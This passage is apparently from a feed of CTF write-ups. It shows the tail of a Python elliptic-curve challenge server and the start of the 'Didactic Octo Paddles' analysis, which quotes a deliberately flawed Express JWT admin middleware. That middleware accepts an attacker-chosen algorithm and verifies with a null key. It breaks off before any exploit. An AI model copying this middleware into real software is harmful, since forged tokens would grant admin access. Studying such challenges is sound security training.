&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk4">'Point confirmed on curve'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">])&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">nextPoints&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">enc_seed&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">prng&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">rotate&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">seed&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">EP&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc_seed&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk4">'New Points'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">EP&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">EP&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">])&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Options:&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'1. Setup Point'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'2. Receive new point'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'3. Find true point'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&amp;gt; '&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">artifact&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Relic&lt;/span>&lt;span class="mtk1">(p, a, b)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">setup&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">while&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">try&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'1'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter x coordinate'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'x: '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">artifact&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">setupPoints&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'Point confirmed on curve'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">setup&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'2'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">setup&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">artifact&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">nextPoints&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Response'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">((&lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">]))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Configure origin point first'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'3'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">setup&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Input x,y'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">Px&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'x: '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">Py&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'y: '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">artifact&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">nextPoints&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">Px&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">and&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">Py&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'You have confirmed the location. It&lt;/span>&lt;span class="mtk6">\'&lt;/span>&lt;span class="mtk4">s dangerous however to go alone. Take this: '&lt;/span>&lt;span class="mtk1">,&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'The vessels will never be found...'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Configure origin point first'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Invalid option, sutting down"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">except&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Exception&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'An error occured: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">response&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> p.bit_length() &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">256&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The server uses Elliptic Curve Cryptography (ECC) with secret parameters (&lt;code>p&lt;/code>, &lt;code>a&lt;/code>, &lt;code>b&lt;/code>). It also uses a custom pseudo-random number generator (PRNG) with the same unknown parameters and a certain formula.&lt;/p></description></item><item><title>Didactic Octo Paddles</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</guid><description>&lt;p>We are given a website like this:&lt;/p>
&lt;p>&lt;img alt="Didactic Octo Paddles 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Didactic-Octo-Paddles-1.webp">&lt;/p>
&lt;p>We also have the source code in Node.js.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>The web application is built with Express JS. After reading some files, one that stands out is &lt;code>middlewares/AdminMiddleware.js&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> jwt &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"jsonwebtoken"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> { &lt;/span>&lt;span class="mtk1">tokenKey&lt;/span>&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"../utils/authorization"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">db&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"../utils/database"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">AdminMiddleware&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">async&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">next&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">try&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sessionCookie&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">.cookies.session;&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk5">!&lt;/span>&lt;span class="mtk1">sessionCookie&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">redirect&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/login"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">decoded&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> jwt.&lt;/span>&lt;span class="mtk8">decode&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">sessionCookie&lt;/span>&lt;span class="mtk1">, { &lt;/span>&lt;span class="mtk1">complete&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk6">true&lt;/span>&lt;span class="mtk1"> });&lt;/span> 

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">decoded&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">header&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">alg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'none'&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">redirect&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/login"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">decoded&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">header&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">alg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"HS256"&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> jwt.&lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">sessionCookie&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">tokenKey&lt;/span>&lt;span class="mtk1">, {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">algorithms&lt;/span>&lt;span class="mtk1">: [&lt;/span>&lt;span class="mtk1">decoded&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">header&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">alg&lt;/span>&lt;span class="mtk1">],&lt;/span>
&lt;span class="mtk1"> });&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">!&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">await&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">db&lt;/span>&lt;span class="mtk1">.Users.&lt;/span>&lt;span class="mtk8">findOne&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">where&lt;/span>&lt;span class="mtk1">: { &lt;/span>&lt;span class="mtk1">id&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">.id, &lt;/span>&lt;span class="mtk1">username&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk4">"admin"&lt;/span>&lt;span class="mtk1"> },&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> ) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">status&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">403&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">send&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"You are not an admin"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> jwt.&lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">sessionCookie&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">null&lt;/span>&lt;span class="mtk1">, {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">algorithms&lt;/span>&lt;span class="mtk1">: [&lt;/span>&lt;span class="mtk1">decoded&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">header&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">alg&lt;/span>&lt;span class="mtk1">],&lt;/span>
&lt;span class="mtk1"> });&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">!&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">await&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">db&lt;/span>&lt;span class="mtk1">.Users.&lt;/span>&lt;span class="mtk8">findOne&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">where&lt;/span>&lt;span class="mtk1">: { &lt;/span>&lt;span class="mtk1">id&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">.id, &lt;/span>&lt;span class="mtk1">username&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk4">"admin"&lt;/span>&lt;span class="mtk1"> },&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> ) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>
&lt;span class="mtk1"> .&lt;/span>&lt;span class="mtk8">status&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">403&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> .&lt;/span>&lt;span class="mtk8">send&lt;/span>&lt;span class="mtk1">({ &lt;/span>&lt;span class="mtk1">message&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk4">"You are not an admin"&lt;/span>&lt;span class="mtk1"> });&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">catch&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">err&lt;/span>&lt;span class="mtk1">) {&lt;/span>
